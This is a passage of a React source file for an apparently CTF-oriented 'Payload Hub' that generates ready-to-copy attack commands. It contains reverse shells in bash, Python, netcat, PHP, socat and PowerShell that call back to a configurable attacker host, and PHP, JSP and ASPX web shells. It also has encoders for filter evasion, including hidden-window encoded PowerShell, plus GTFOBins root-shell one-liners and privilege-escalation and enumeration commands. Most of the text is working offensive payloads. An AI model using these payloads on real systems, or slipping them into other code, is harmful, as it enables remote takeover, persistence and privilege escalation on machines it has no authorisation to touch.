import React, { useState } from 'react';
import { 
  Terminal, 
  Copy, 
  Check, 
  Shield, 
  Flame, 
  Globe, 
  Sparkles, 
  Sliders, 
  ShieldCheck, 
  Network,
  Cpu,
  Search,
  BookOpen,
  Code
} from 'lucide-react';

export const PayloadHub: React.FC = () => {
  const [lhost, setLhost] = useState('10.10.14.5');
  const [lport, setLport] = useState('4444');
  const [shell, setShell] = useState('/bin/bash');
  const [category, setCategory] = useState<'revshells' | 'webshells' | 'listener' | 'tty' | 'privesc' | 'network' | 'stager'>('revshells');
  const [encoding, setEncoding] = useState<'raw' | 'base64_sh' | 'python3_b64' | 'ifs' | 'url' | 'powershell_b64'>('raw');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Custom Command Stager State
  const [customCmd, setCustomCmd] = useState('cat /flag.txt');

  // Network / Subnet Calculator State
  const [cidrInput, setCidrInput] = useState('10.10.10.15/24');
  const [portsFilter, setPortsFilter] = useState('');

  const safeB64 = (str: string) => {
    try {
      return btoa(unescape(encodeURIComponent(str || '')));
    } catch {
      return '';
    }
  };

  const toUtf16LeBase64 = (str: string) => {
    try {
      const bytes = [];
      for (let i = 0; i < (str || '').length; i++) {
        const code = str.charCodeAt(i);
        bytes.push(code & 0xff);
        bytes.push((code >> 8) & 0xff);
      }
      let binary = '';
      for (let i = 0; i < bytes.length; i++) {
        binary += String.fromCharCode(bytes[i]);
      }
      return btoa(binary);
    } catch {
      return '';
    }
  };

  // Encode helper
  const encodePayload = (raw: string, format: 'raw' | 'base64_sh' | 'python3_b64' | 'ifs' | 'url' | 'powershell_b64') => {
    if (format === 'url') {
      return encodeURIComponent(raw);
    }
    if (format === 'base64_sh') {
      const b64 = safeB64(raw);
      return b64 ? `sh -c "$(echo ${b64} | base64 -d)"` : raw;
    }
    if (format === 'python3_b64') {
      const b64 = safeB64(raw);
      return b64 ? `python3 -c "import base64;exec(base64.b64decode('${b64}'))"` : raw;
    }
    if (format === 'ifs') {
      return raw.replace(/ /g, '${IFS}');
    }
    if (format === 'powershell_b64') {
      const b64 = toUtf16LeBase64(raw);
      return b64 ? `powershell -nop -w hidden -EncodedCommand ${b64}` : raw;
    }
    return raw;
  };

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const reverseShells = [
    {
      id: 'bash_i',
      title: 'Bash Interactive (/dev/tcp)',
      desc: 'Standard modern Linux reverse shell',
      payload: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
    },
    {
      id: 'bash_196',
      title: 'Bash 196 (Fd Redirect)',
      desc: 'Bypasses some simple bash interactive restrictions',
      payload: `0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; ${shell} <&196 >&196 2>&196`,
    },
    {
      id: 'python3_pty',
      title: 'Python 3 Interactive PTY',
      desc: 'Spawns a full interactive TTY session over raw TCP socket',
      payload: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("${shell}")'`,
    },
    {
      id: 'nc_mkfifo',
      title: 'Netcat (OpenBSD mkfifo)',
      desc: 'Works when nc does not have -e / -c compiled in',
      payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
    },
    {
      id: 'nc_e',
      title: 'Netcat Traditional (-e)',
      desc: 'Traditional netcat with executable flag',
      payload: `nc -e ${shell} ${lhost} ${lport}`,
    },
    {
      id: 'php_exec',
      title: 'PHP CLI Reverse Shell',
      desc: 'Standard PHP CLI socket payload',
      payload: `php -r '$sock=fsockopen("${lhost}",${lport});exec("${shell} -i <&3 >&3 2>&3");'`,
    },
    {
      id: 'socat',
      title: 'Socat Interactive',
      desc: 'Stable single-binary socket connection',
      payload: `socat TCP:${lhost}:${lport} EXEC:${shell}`,
    },
    {
      id: 'powershell_tcp',
      title: 'PowerShell Reverse TCP',
      desc: 'Native Windows PowerShell reverse shell client',
      payload: `$c=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbyte=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbyte,0,$sbyte.Length);$s.Flush()};$c.Close()`,
    },
    {
      id: 'powershell_b64',
      title: 'PowerShell Encoded Command (-enc)',
      desc: 'UTF-16LE Base64 encoded payload for cmd.exe bypass',
      payload: (() => {
        const rawPs = `$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbyte=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sbyte,0,$sbyte.Length);$s.Flush()};$c.Close()`;
        let utf16 = '';
        for (let i = 0; i < rawPs.length; i++) {
          utf16 += rawPs[i] + '\0';
        }
        return `powershell -nop -w hidden -enc ${btoa(utf16)}`;
      })(),
    }
  ];

  const webShells = [
    {
      id: 'php_simple',
      title: 'PHP 1-Liner (system)',
      desc: 'Access via: target.com/shell.php?cmd=whoami',
      payload: `<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>`,
    },
    {
      id: 'php_pre',
      title: 'PHP Formatted Output (<pre>)',
      desc: 'Executes command and wraps stdout in preformatted tags',
      payload: `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; } ?>`,
    },
    {
      id: 'jsp_runtime',
      title: 'JSP Runtime Exec',
      desc: 'For Apache Tomcat / Java web targets',
      payload: `<% if(request.getParameter("cmd") != null){ Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); java.io.InputStream in = p.getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b, 0, a)); } } %>`,
    },
    {
      id: 'aspx_simple',
      title: 'ASPX C# One-Liner',
      desc: 'For Microsoft IIS web servers',
      payload: `<%@ Page Language="C#" %><% Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}}.Start() ? "OK" : ""); %>`,
    }
  ];

  const ttyCommands = [
    {
      step: 'Step 1: In Reverse Shell',
      title: 'Spawn PTY via Python',
      cmd: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
    },
    {
      step: 'Step 2: Background Process',
      title: 'Send Shell to Background',
      cmd: `Ctrl + Z (Press together on your keyboard)`,
    },
    {
      step: 'Step 3: On Local Terminal',
      title: 'Fix Terminal Echo & Foreground',
      cmd: `stty raw -echo; fg`,
    },
    {
      step: 'Step 4: Re-initialize Environment',
      title: 'Export Terminal & Dimensions',
      cmd: `reset\nexport TERM=xterm-256color\nstty rows 38 cols 120`,
    }
  ];

  const listeners = [
    {
      id: 'rlwrap_nc',
      title: 'Netcat with rlwrap (Arrow Keys Support)',
      desc: 'Highly recommended for working bash history and arrows',
      cmd: `rlwrap nc -lvnp ${lport}`,
    },
    {
      id: 'pwncat_cs',
      title: 'pwncat-cs (Auto TTY & PrivEsc Triage)',
      desc: 'Advanced post-exploitation listener',
      cmd: `pwncat-cs -lp ${lport}`,
    },
    {
      id: 'socat_listener',
      title: 'Socat Full TTY Listener',
      desc: 'Pairs with socat client payload',
      cmd: `socat file:\`tty\`,raw,echo=0 TCP-L:${lport}`,
    }
  ];

  // Privilege Escalation Commands
  const privEscSnippets = [
    {
      os: 'Linux',
      title: 'Find SUID Binaries',
      desc: 'Lists executable files owned by root with the SUID bit set',
      cmd: 'find / -perm -u=s -type f 2>/dev/null',
    },
    {
      os: 'Linux',
      title: 'Sudo Permissions Check',
      desc: 'Lists allowed commands for current user via sudo',
      cmd: 'sudo -l',
    },
    {
      os: 'Linux',
      title: 'Linux File Capabilities',
      desc: 'Checks if binaries have elevated capability bits (e.g. cap_setuid)',
      cmd: 'getcap -r / 2>/dev/null',
    },
    {
      os: 'Linux',
      title: 'GTFOBins: Find SUID Shell',
      desc: 'Spawns root shell if find binary has SUID bit set',
      cmd: 'find . -exec /bin/sh -p \\; -quit',
    },
    {
      os: 'Linux',
      title: 'GTFOBins: Vim SUID Shell',
      desc: 'Spawns root shell from inside vim with SUID bit',
      cmd: 'vim -c \':!/bin/sh\'',
    },
    {
      os: 'Linux',
      title: 'Cron Jobs & Scheduled Tasks',
      desc: 'Inspects global crontabs for writable root scripts',
      cmd: 'cat /etc/crontab /etc/cron.*/* 2>/dev/null',
    },
    {
      os: 'Windows',
      title: 'Check Token Privileges',
      desc: 'Look for SeImpersonatePrivilege or SeAssignPrimaryToken',
      cmd: 'whoami /priv',
    },
    {
      os: 'Windows',
      title: 'Unquoted Service Paths',
      desc: 'Searches for services installed in paths with spaces and no quotes',
      cmd: 'wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\\windows\\\\" |findstr /i /v """',
    },
    {
      os: 'Windows',
      title: 'AlwaysInstallElevated Registry Check',
      desc: 'If value 1, MSI packages will install with full SYSTEM privileges',
      cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
    }
  ];

  // Common CTF Ports & Enumeration
  const commonPorts = [
    { port: 21, service: 'FTP', tool: 'nmap / ftp', cmd: `nmap -p21 -sV --script ftp-anon ${lhost}` },
    { port: 22, service: 'SSH', tool: 'ssh', cmd: `ssh -oHostKeyAlgorithms=+ssh-rsa user@${lhost}` },
    { port: 80, service: 'HTTP', tool: 'ffuf / nikto', cmd: `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://${lhost}/FUZZ` },
    { port: 88, service: 'Kerberos', tool: 'GetNPUsers', cmd: `impacket-GetNPUsers domain/ -no-pass -usersfile users.txt -dc-ip ${lhost}` },
    { port: 139, service: 'NetBIOS', tool: 'nmblookup', cmd: `nmblookup -A ${lhost}` },
    { port: 445, service: 'SMB', tool: 'smbclient', cmd: `smbclient -L //${lhost}/ -N && enum4linux -a ${lhost}` },
    { port: 1433, service: 'MSSQL', tool: 'mssqlclient', cmd: `impacket-mssqlclient user:pass@${lhost} -windows-auth` },
    { port: 2049, service: 'NFS', tool: 'showmount', cmd: `showmount -e ${lhost} && mkdir /tmp/nfs && mount -t nfs ${lhost}:/share /tmp/nfs` },
    { port: 3306, service: 'MySQL', tool: 'mysql', cmd: `mysql -h ${lhost} -u root -p` },
    { port: 3389, service: 'RDP', tool: 'xfreerdp', cmd: `xfreerdp /u:administrator /p:password /v:${lhost} +clipboard` },
    { port: 5985, service: 'WinRM', tool: 'evil-winrm', cmd: `evil-winrm -i ${lhost} -u administrator -p password` },
    { port: 6379, service: 'Redis', tool: 'redis-cli', cmd: `redis-cli -h ${lhost} info` },
    { port: 8080, service: 'HTTP-Alt', tool: 'gobuster', cmd: `gobuster dir -u http://${lhost}:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt` }
  ];

  // Subnet Calculation Logic
  const calculateSubnet = (cidrStr: string) => {
    try {
      const parts = cidrStr.trim().split('/');
      if (parts.length !== 2) return null;
      const ip = parts[0];
      const prefix = parseInt(parts[1], 10);
      if (isNaN(prefix) || prefix < 0 || prefix > 32) return null;

      const ipOctets = ip.split('.').map(Number);
      if (ipOctets.length !== 4 || ipOctets.some(o => isNaN(o) || o < 0 || o > 255)) return null;

      const ipInt = (ipOctets[0] << 24) | (ipOctets[1] << 16) | (ipOctets[2] << 8) | ipOctets[3];
      const maskInt = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0;
      const netInt = (ipInt & maskInt) >>> 0;
      const bcastInt = (netInt | ~maskInt) >>> 0;

      const intToIp = (val: number) => [
        (val >>> 24) & 255,
        (val >>> 16) & 255,
        (val >>> 8) & 255,
        val & 255
      ].join('.');

      const wildcardInt = ~maskInt >>> 0;
      const usableHosts = prefix >= 31 ? 0 : Math.max(0, (bcastInt - netInt - 1));
      const minHost = prefix >= 31 ? intToIp(netInt) : intToIp(netInt + 1);
      const maxHost = prefix >= 31 ? intToIp(bcastInt) : intToIp(bcastInt - 1);

      return {
        network: intToIp(netInt),
        netmask: intToIp(maskInt),
        wildcard: intToIp(wildcardInt),
        broadcast: intToIp(bcastInt),
        hostMin: minHost,
        hostMax: maxHost,
        usableHosts
      };
    } catch {
      return null;
    }
  };

  const subnetInfo = calculateSubnet(cidrInput);

  return (
    <div className="max-w-5xl mx-auto space-y-6">
      {/* Header */}
      <div className="border-b border-slate-800 pb-4">
        <h2 className="text-xl font-semibold font-sans text-slate-100 flex items-center gap-2">
          <Flame className="w-5 h-5 text-emerald-400" />
          Exploit Payloads & Post-Exploitation Reference
        </h2>
        <p className="text-slate-400 text-xs mt-1 font-sans">
          Synchronized reverse shells, web shells, Linux/Windows privilege escalation vectors, and network CIDR/port enumeration reference.
        </p>
      </div>

      {/* Target Parameters Bar */}
      <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 font-mono text-xs space-y-4">
        <div className="flex items-center justify-between border-b border-cyber-border pb-3">
          <span className="font-bold text-cyber-green uppercase flex items-center gap-2">
            <Sliders className="w-4 h-4" />
            Connection Parameters
          </span>
          <span className="text-[11px] text-gray-500">Live Payload Synchronization</span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div>
            <label className="text-gray-400 uppercase block mb-1.5">LHOST (Local IP / VPN)</label>
            <input
              type="text"
              value={lhost}
              onChange={(e) => setLhost(e.target.value)}
              placeholder="e.g. 10.10.14.5"
              className="w-full bg-cyber-darker border border-cyber-border rounded-lg px-3 py-2 text-white placeholder-gray-600 focus:outline-none focus:border-cyber-green"
            />
          </div>

          <div>
            <label className="text-gray-400 uppercase block mb-1.5">LPORT (Listen Port)</label>
            <input
              type="text"
              value={lport}
              onChange={(e) => setLport(e.target.value)}
              placeholder="e.g. 4444"
              className="w-full bg-cyber-darker border border-cyber-border rounded-lg px-3 py-2 text-white placeholder-gray-600 focus:outline-none focus:border-cyber-green"
            />
          </div>

          <div>
            <label className="text-gray-400 uppercase block mb-1.5">Shell Binary</label>
            <select
              value={shell}
              onChange={(e) => setShell(e.target.value)}
              className="w-full bg-cyber-darker border border-cyber-border rounded-lg px-3 py-2 text-white focus:outline-none focus:border-cyber-green"
            >
              <option value="/bin/bash">/bin/bash</option>
              <option value="/bin/sh">/bin/sh</option>
              <option value="/bin/zsh">/bin/zsh</option>
              <option value="cmd.exe">cmd.exe</option>
              <option value="powershell.exe">powershell.exe</option>
            </select>
          </div>
        </div>

        {/* Encoding Selector */}
        <div className="flex flex-wrap items-center justify-between gap-2 pt-2">
          <div className="flex flex-wrap items-center gap-1.5">
            <span className="text-gray-400 uppercase text-[11px] font-bold mr-1">Output Stager / Bypass:</span>
            {[
              { id: 'raw', label: 'Raw' },
              { id: 'base64_sh', label: 'Base64 sh' },
              { id: 'python3_b64', label: 'Python3 b64' },
              { id: 'ifs', label: 'IFS Space' },
              { id: 'url', label: 'URL Encode' },
              { id: 'powershell_b64', label: 'PowerShell b64' }
            ].map((enc) => (
              <button
                key={enc.id}
                onClick={() => setEncoding(enc.id as any)}
                className={`px-2.5 py-1 rounded text-[11px] font-mono transition-all ${
                  encoding === enc.id
                    ? 'bg-cyber-green text-black font-bold'
                    : 'bg-cyber-darker border border-cyber-border text-gray-400 hover:text-white'
                }`}
              >
                {enc.label}
              </button>
            ))}
          </div>

          <div className="text-[11px] text-gray-500 font-mono">
            {encoding === 'url' ? 'URL encoded for HTTP param injection' 
              : encoding === 'base64_sh' ? 'Linux sh -c "$(echo ... | base64 -d)"'
              : encoding === 'python3_b64' ? 'Python3 base64 exec stager'
              : encoding === 'ifs' ? 'Space filter bypass (${IFS})'
              : encoding === 'powershell_b64' ? 'Windows PowerShell UTF-16LE -EncodedCommand'
              : 'Direct unencoded command'}
          </div>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex border-b border-cyber-border gap-2 overflow-x-auto">
        <button
          onClick={() => setCategory('revshells')}
          className={`flex items-center gap-2 px-4 py-2 text-xs font-mono rounded-t-lg transition-all border-t border-x shrink-0 ${
            category === 'revshells'
              ? 'bg-cyber-card border-cyber-green text-cyber-green font-bold'
              : 'border-transparent text-gray-400 hover:text-white'
          }`}
        >
          <Flame className="w-4 h-4 text-orange-400" />
          Reverse Shells ({reverseShells.length})
        </button>
        <button
          onClick={() => setCategory('webshells')}
          className={`flex items-center gap-2 px-4 py-2 text-xs font-mono rounded-t-lg transition-all border-t border-x shrink-0 ${
            category === 'webshells'
              ? 'bg-cyber-card border-cyber-cyan text-cyber-cyan font-bold'
              : 'border-transparent text-gray-400 hover:text-white'
          }`}
        >
          <Globe className="w-4 h-4 text-cyber-cyan" />
          Web Shells ({webShells.length})
        </button>
        <button
          onClick={() => setCategory('listener')}
          className={`flex items-center gap-2 px-4 py-2 text-xs font-mono rounded-t-lg transition-all border-t border-x shrink-0 ${
            category === 'listener'
              ? 'bg-cyber-card border-yellow-500 text-yellow-300 font-bold'
              : 'border-transparent text-gray-400 hover:text-white'
          }`}
        >
          <Terminal className="w-4 h-4 text-yellow-400" />
          Listener Commands
        </button>
        <button
          onClick={() => setCategory('tty')}
          className={`flex items-center gap-2 px-4 py-2 text-xs font-mono rounded-t-lg transition-all border-t border-x shrink-0 ${
            category === 'tty'
              ? 'bg-cyber-card border-purple-500 text-purple-300 font-bold'
              : 'border-transparent text-gray-400 hover:text-white'
          }`}
        >
          <Sparkles className="w-4 h-4 text-purple-400" />
          TTY Upgrade
        </button>
        <button
          onClick={() => setCategory('privesc')}
          className={`flex items-center gap-2 px-4 py-2 text-xs font-mono rounded-t-lg transition-all border-t border-x shrink-0 ${
            category === 'privesc'
              ? 'bg-cyber-card border-red-500 text-red-300 font-bold'
              : 'border-transparent text-gray-400 hover:text-white'
          }`}
        >
          <ShieldCheck className="w-4 h-4 text-red-400" />
          Privilege Escalation ({privEscSnippets.length})
        </button>
        <button
          onClick={() => setCategory('network')}
          className={`flex items-center gap-2 px-4 py-2 text-xs font-mono rounded-t-lg transition-all border-t border-x shrink-0 ${
            category === 'network'
              ? 'bg-cyber-card border-blue-500 text-blue-300 font-bold'
              : 'border-transparent text-gray-400 hover:text-white'
          }`}
        >
          <Network className="w-4 h-4 text-blue-400" />
          Network & Ports ({commonPorts.length})
        </button>
        <button
          onClick={() => setCategory('stager')}
          className={`flex items-center gap-2 px-4 py-2 text-xs font-mono rounded-t-lg transition-all border-t border-x shrink-0 ${
            category === 'stager'
              ? 'bg-cyber-card border-emerald-500 text-emerald-300 font-bold'
              : 'border-transparent text-gray-400 hover:text-white'
          }`}
        >
          <Code className="w-4 h-4 text-emerald-400" />
          [WEB] RCE Stagers & Wrappers
        </button>
      </div>

      {/* REVERSE SHELLS */}
      {category === 'revshells' && (
        <div className="space-y-3 font-mono text-xs">
          {reverseShells.map((shellItem) => {
            const formatted = encodePayload(shellItem.payload, encoding);
            return (
              <div
                key={shellItem.id}
                className="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2 hover:border-cyber-green/40 transition-colors"
              >
                <div className="flex items-center justify-between">
                  <div>
                    <h4 className="font-bold text-white text-sm">{shellItem.title}</h4>
                    <span className="text-[11px] text-gray-400">{shellItem.desc}</span>
                  </div>
                  <button
                    onClick={() => handleCopy(formatted, shellItem.id)}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-darker border border-cyber-border hover:border-cyber-green/50 text-gray-300 hover:text-cyber-green transition-all"
                  >
                    {copiedId === shellItem.id ? (
                      <>
                        <Check className="w-3.5 h-3.5 text-cyber-green" />
                        <span className="text-cyber-green font-bold">Copied!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3.5 h-3.5" />
                        <span>Copy</span>
                      </>
                    )}
                  </button>
                </div>
                <pre className="bg-black/70 border border-cyber-border rounded-lg p-3 text-cyber-green text-xs overflow-x-auto whitespace-pre-wrap select-all">
                  {formatted}
                </pre>
              </div>
            );
          })}
        </div>
      )}

      {/* WEB SHELLS */}
      {category === 'webshells' && (
        <div className="space-y-3 font-mono text-xs">
          {webShells.map((webItem) => {
            const formatted = encodePayload(webItem.payload, encoding);
            return (
              <div
                key={webItem.id}
                className="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2 hover:border-cyber-cyan/40 transition-colors"
              >
                <div className="flex items-center justify-between">
                  <div>
                    <h4 className="font-bold text-white text-sm">{webItem.title}</h4>
                    <span className="text-[11px] text-gray-400">{webItem.desc}</span>
                  </div>
                  <button
                    onClick={() => handleCopy(formatted, webItem.id)}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-darker border border-cyber-border hover:border-cyber-cyan/50 text-gray-300 hover:text-cyber-cyan transition-all"
                  >
                    {copiedId === webItem.id ? (
                      <>
                        <Check className="w-3.5 h-3.5 text-cyber-cyan" />
                        <span className="text-cyber-cyan font-bold">Copied!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3.5 h-3.5" />
                        <span>Copy</span>
                      </>
                    )}
                  </button>
                </div>
                <pre className="bg-black/70 border border-cyber-border rounded-lg p-3 text-cyber-cyan text-xs overflow-x-auto whitespace-pre-wrap select-all">
                  {formatted}
                </pre>
              </div>
            );
          })}
        </div>
      )}

      {/* LISTENERS */}
      {category === 'listener' && (
        <div className="space-y-3 font-mono text-xs">
          {listeners.map((listener) => (
            <div
              key={listener.id}
              className="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2 hover:border-yellow-500/40 transition-colors"
            >
              <div className="flex items-center justify-between">
                <div>
                  <h4 className="font-bold text-white text-sm">{listener.title}</h4>
                  <span className="text-[11px] text-gray-400">{listener.desc}</span>
                </div>
                <button
                  onClick={() => handleCopy(listener.cmd, listener.id)}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-darker border border-cyber-border hover:border-yellow-500/50 text-gray-300 hover:text-yellow-300 transition-all"
                >
                  {copiedId === listener.id ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-yellow-400" />
                      <span className="text-yellow-400 font-bold">Copied!</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5" />
                      <span>Copy</span>
                    </>
                  )}
                </button>
              </div>
              <pre className="bg-black/70 border border-cyber-border rounded-lg p-3 text-yellow-300 text-xs overflow-x-auto whitespace-pre-wrap select-all">
                {listener.cmd}
              </pre>
            </div>
          ))}
        </div>
      )}

      {/* TTY UPGRADE */}
      {category === 'tty' && (
        <div className="bg-cyber-card border border-cyber-border rounded-xl p-6 space-y-5 font-mono text-xs">
          <div className="border-b border-cyber-border pb-3">
            <h4 className="font-bold text-white text-sm flex items-center gap-2">
              <Sparkles className="w-4 h-4 text-purple-400" />
              Full Interactive TTY Upgrade Sequence
            </h4>
            <p className="text-gray-400 text-xs mt-1">
              Follow these 4 steps in order to convert a dumb netcat socket into a full pseudo-terminal with autocomplete, Ctrl+C handling, and nano/vim support.
            </p>
          </div>

          <div className="space-y-4">
            {ttyCommands.map((tty, idx) => (
              <div key={idx} className="bg-cyber-darker border border-cyber-border rounded-lg p-4 space-y-2">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-purple-400 uppercase text-[11px]">{tty.step}</span>
                  <button
                    onClick={() => handleCopy(tty.cmd, `tty_${idx}`)}
                    className="p-1 text-gray-400 hover:text-white"
                  >
                    {copiedId === `tty_${idx}` ? <Check className="w-3.5 h-3.5 text-purple-400" /> : <Copy className="w-3.5 h-3.5" />}
                  </button>
                </div>
                <div className="text-white text-xs font-semibold">{tty.title}</div>
                <pre className="bg-black/60 p-2.5 rounded border border-cyber-border text-cyber-cyan text-xs select-all whitespace-pre-wrap">
                  {tty.cmd}
                </pre>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* PRIVILEGE ESCALATION */}
      {category === 'privesc' && (
        <div className="space-y-4 font-mono text-xs">
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-4 flex items-center justify-between">
            <span className="text-gray-400">
              Curated Linux SUID, Sudo, GTFOBins, and Windows Privilege Escalation Vectors
            </span>
            <span className="text-[11px] text-gray-500 font-bold">{privEscSnippets.length} Vectors Loaded</span>
          </div>

          <div className="space-y-3">
            {privEscSnippets.map((item, idx) => (
              <div
                key={idx}
                className="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2 hover:border-red-500/40 transition-colors"
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className={`px-2 py-0.5 rounded font-bold uppercase text-[10px] ${
                      item.os === 'Linux' ? 'bg-orange-950/60 text-orange-400 border border-orange-500/40' : 'bg-blue-950/60 text-blue-400 border border-blue-500/40'
                    }`}>
                      {item.os}
                    </span>
                    <h4 className="font-bold text-white text-sm">{item.title}</h4>
                  </div>
                  <button
                    onClick={() => handleCopy(item.cmd, `priv_${idx}`)}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-darker border border-cyber-border hover:border-red-500/50 text-gray-300 hover:text-red-300 transition-all"
                  >
                    {copiedId === `priv_${idx}` ? (
                      <>
                        <Check className="w-3.5 h-3.5 text-red-400" />
                        <span className="text-red-400 font-bold">Copied!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3.5 h-3.5" />
                        <span>Copy</span>
                      </>
                    )}
                  </button>
                </div>
                <p className="text-gray-400 text-xs">{item.desc}</p>
                <pre className="bg-black/75 border border-cyber-border rounded-lg p-3 text-red-300 text-xs overflow-x-auto whitespace-pre-wrap select-all">
                  {item.cmd}
                </pre>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* NETWORK & PORTS */}
      {category === 'network' && (
        <div className="space-y-5 font-mono text-xs">
          {/* Subnet / CIDR Calculator */}
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
            <div className="flex items-center justify-between border-b border-cyber-border pb-3">
              <span className="font-bold text-blue-400 uppercase flex items-center gap-2">
                <Network className="w-4 h-4" /> IPv4 CIDR / Subnet Calculator
              </span>
              <span className="text-[11px] text-gray-500">Fast Bitwise Math</span>
            </div>

            <div className="flex gap-3 items-center">
              <div className="flex-1">
                <label className="text-gray-400 uppercase block mb-1.5">Enter IP / CIDR Prefix</label>
                <input
                  type="text"
                  value={cidrInput}
                  onChange={(e) => setCidrInput(e.target.value)}
                  placeholder="e.g. 10.10.10.15/24 or 192.168.1.100/26"
                  className="w-full bg-cyber-darker border border-cyber-border rounded-lg px-3 py-2 text-white placeholder-gray-600 focus:outline-none focus:border-blue-500"
                />
              </div>
            </div>

            {subnetInfo ? (
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3 pt-2">
                <div className="bg-cyber-darker p-3 rounded border border-cyber-border">
                  <span className="text-[10px] text-gray-500 uppercase block">Network ID</span>
                  <span className="text-blue-400 font-bold text-xs select-all">{subnetInfo.network}</span>
                </div>
                <div className="bg-cyber-darker p-3 rounded border border-cyber-border">
                  <span className="text-[10px] text-gray-500 uppercase block">Subnet Mask</span>
                  <span className="text-white font-bold text-xs select-all">{subnetInfo.netmask}</span>
                </div>
                <div className="bg-cyber-darker p-3 rounded border border-cyber-border">
                  <span className="text-[10px] text-gray-500 uppercase block">Broadcast IP</span>
                  <span className="text-purple-400 font-bold text-xs select-all">{subnetInfo.broadcast}</span>
                </div>
                <div className="bg-cyber-darker p-3 rounded border border-cyber-border">
                  <span className="text-[10px] text-gray-500 uppercase block">Usable Hosts</span>
                  <span className="text-cyber-green font-bold text-xs">{subnetInfo.usableHosts.toLocaleString()}</span>
                </div>
                <div className="col-span-2 bg-cyber-darker p-3 rounded border border-cyber-border">
                  <span className="text-[10px] text-gray-500 uppercase block">Usable Host Range</span>
                  <span className="text-gray-300 font-bold text-xs select-all">
                    {subnetInfo.hostMin} — {subnetInfo.hostMax}
                  </span>
                </div>
                <div className="col-span-2 bg-cyber-darker p-3 rounded border border-cyber-border">
                  <span className="text-[10px] text-gray-500 uppercase block">Wildcard Mask</span>
                  <span className="text-gray-400 font-bold text-xs select-all">{subnetInfo.wildcard}</span>
                </div>
              </div>
            ) : (
              <p className="text-xs text-red-400">Invalid CIDR format. Please use format like 10.10.10.0/24</p>
            )}
          </div>

          {/* Common CTF Service Ports Cheatsheet */}
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
            <div className="flex items-center justify-between border-b border-cyber-border pb-3">
              <span className="font-bold text-cyber-cyan uppercase flex items-center gap-2">
                <BookOpen className="w-4 h-4" /> Common CTF Ports & Enumeration Cheatsheet
              </span>
              <div className="relative w-48">
                <Search className="w-3.5 h-3.5 text-gray-500 absolute left-2.5 top-2" />
                <input
                  type="text"
                  value={portsFilter}
                  onChange={(e) => setPortsFilter(e.target.value)}
                  placeholder="Filter port / service..."
                  className="w-full bg-cyber-darker border border-cyber-border rounded px-2.5 py-1 pl-8 text-xs text-white placeholder-gray-600 focus:outline-none focus:border-cyber-cyan"
                />
              </div>
            </div>

            <div className="space-y-2 max-h-96 overflow-y-auto pr-1">
              {commonPorts
                .filter(p => !portsFilter || String(p.port).includes(portsFilter) || p.service.toLowerCase().includes(portsFilter.toLowerCase()))
                .map((portItem) => (
                  <div
                    key={portItem.port}
